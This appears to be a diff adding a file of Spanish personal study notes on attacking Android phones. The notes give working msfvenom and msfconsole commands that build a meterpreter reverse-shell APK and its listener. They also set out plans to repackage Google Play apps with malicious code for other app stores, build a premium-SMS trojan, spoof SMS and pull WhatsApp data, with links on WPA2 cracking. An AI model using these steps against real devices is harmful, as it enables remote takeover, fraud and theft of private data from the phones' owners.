@@ -1,0 +1,124 @@
+Overview
+--------
+
+Pruebas prácticas hechas con Kali Linux para hackear Android; uso de Metasploit para hackear Android.
+Generación de un malware con ingeniería inversa.
+Ataque con un exploit que aprovecha una vulnerabilidad de un equipo Android. Por ejemplo, un ataque de código USSD.
+
+Darle interés a los celulares rooteados.
+La mayoría de los ataques/malwares usan la WiFi y la ingeniería social como medio para alcanzar a sus víctimas.
+
+Antes de aplicar las prácticas en mi propio celular
+---------------------------------------------------
+
+- Tomar recaudos: backup de todos los datos que hacen personal a mi smartphone (agenda, fotos, mp3, aplicaciones instaladas y los datos que generan, ). Para ello se puede guardar todos los datos de la SD en una carpeta dentro de mi PC y luego guardar una ROM de mi sistema Android.
+- Listo! el celular está listo para aplicarle todas las pruebas.
+
+Cuestión: ¿ Debo comprar un celular ? ... primero rompe el míó, luego veo si debo comprar.
+
+Pruebas en mi celular
+---------------------
+
+Primero debo realizar un backup de mis datos que estan en la SD Card y contactos (que los guardo en la SIM Card).
+Luego, de informarme acerca de lo que puede llegar a hacer.
+No pude generar un backup del sistema (Android + mis aplicaciones instaladas), en forma de imagen.
+
+En fin, proseguí. Ejecuté los siguientes comandos:
+ifconfig
+// del resultado de este comando se obtiene la IP que nos sirve como parámetro llamado LHOST en el siguiente comando
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=8080 R > andro.apk
+// se abre otra consola INMEDIATAMENTE y se ejecuta
+msfconsole
+use multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.0.10
+set lport 8080
+exploit
+// Listo, del primer comando se genera el instalador del exploit.
+// Cuando se instale en el dispositivo víctima, en la segunda consola se abrirá un shell de comandos para operar con el dispositivo:
+meterpreter >
+
+Fuente:
+https://www.youtube.com/watch?v=IQEWdymYgzQ
+http://kalitut.blogspot.com.ar/2015/08/exploit-android-using-kali-linux.html
+
+Análisis de mi experiencia con el decompilado de aplicaciones
+-------------------------------------------------------------
+
+La idea es bajar aplicaciones de Google Play a mi celular, luego se decompila para agregarle algún código malicioso y se vuelve a compilar para publicarlo en algún Store de Apps ajeno a Google Play.
+- Para capturar las aplicaciones que están en mi celular se debe rootear el dispositivo. Dado que las aplicaciones que me bajo de Google Play estan en /data/app y las que vienen con mi celular (que no las puedo borrar en un celular sin rootear) estan en /system/app. Por ahora intento evitar el rooteo del dispositivo.
+{ http://stackoverflow.com/questions/12175904/where-can-i-find-the-apk-file-on-my-device-when-i-download-any-app-and-install }
+{ http://stackoverflow.com/questions/2507960/does-android-keep-the-apk-files-if-so-where }
+- Bajé aplicaciones de Google Play para explorar archivos del sistema, pero me está demorando.
+- 
+
+SMS Spoofing
+------------
+
+SMS Spoofing te permite cambiar el nombre o el número del remitente que aparecerá en el dispositivo destino.
+
+Usando smsglobal.com para aplicar sms spoofing:
+https://www.youtube.com/watch?v=4DehY993rnI
+
+Demostración sencilla en un entorno protegido (irreal), se usa un emulador AVD y Telnet:
+https://www.youtube.com/watch?v=SmHGFrm3Oc0
+
+Probar este servicio que es para mandar SMS a muy bajo precio (no sé si me permite hacer spoofing):
+https://www.smsc.com.ar/usuario/iniciar/
+
+Para realizar SMS Spoofing utilizando el antecesor de Kali Linux (Back Track)
+http://null-byte.wonderhowto.com/how-to/hacks-mr-robot-send-spoofed-sms-text-message-0163331/
+
+Intenté averiguar como se puede realizar ésto desde adentro de una aplicación (por programación, utilizando la API de Android):
+http://stackoverflow.com/questions/7550178/intercepting-outgoing-sms?rq=1
+http://stackoverflow.com/questions/5589395/intercept-read-and-cancel-sms-message
+No se puede, solo se puede leer los SMS salientes.
+
+SMS a bajo nivel:
+http://www.developershome.com/sms/howToSendSMSFromPC.asp
+
+Generalidades de SMS (sirven como introducción al tema de los SMS):
+https://en.wikipedia.org/wiki/Short_message_service_center
+https://en.wikipedia.org/wiki/SMS_spoofing
+http://www.smsspoofing.com/
+
+Rooteando un celular (No sé si debe ir una sección dedicada a esta práctica??)
+--------------------
+
+Es una forma de acceder a un celular con privilegios de superusuario. Con lo cual, se considera que es una vulnerabilidad del sistema operativo.
+http://whiteboard.ping.se/Android/Rooting
+http://www.xda-developers.com/root/
+
+Ataques a la WIfi (y sniffing)
+-----------------
+
+Fuentes:
+http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-with-cowpatty-0148423/
+http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/
+https://www.youtube.com/watch?v=Spnn_vPpYqg
+
+Ataque a un canal bluetooth
+---------------------------
+
+Para listar los dispositivos bluetooth asociados al dispositivo:
+bt-device -l
+Para listar los dispositivos bluetooth al alcance (con respecto a la señal):
+hcitool scan
+Fuente:
+http://unix.stackexchange.com/questions/96693/connect-to-a-bluetooth-device-via-terminal
+http://linuxcommand.org/man_pages/hcitool1.html
+
+Resumen
+-------
+
++ Un ejemplo práctico: podría generar un troyano (app disfrazada) que envíe SMS Premium.
++ Ataque de actualización:
+	sucedió con DroidKungFu:
+	- Publican una aplicación legítima.
+	- Cierto número de usuarios descarga la app.
+	- Inyectan Malware en una actualización.
++ Ataques y Sniffing vía NFC, WiFi y Bluetooth sobre celulares.
++ Ataques por códigos USSD.
++ Presentación de herramientas y ejemplos de su uso: apktool, baksmali, smali y dex2jar.
++ Generar el malware con msfvenom que aún no lo pude generar.
++ Quizás, se pueda aprovechar alguna vulnerabilidad de una app específica para robar datos privados de esa app, ej.: WhatsApp. Se podría desmembrar esta aplicación en búsqueda de las vulnerabilidades.. donde está ubicado el log de chats, contactos, etc.
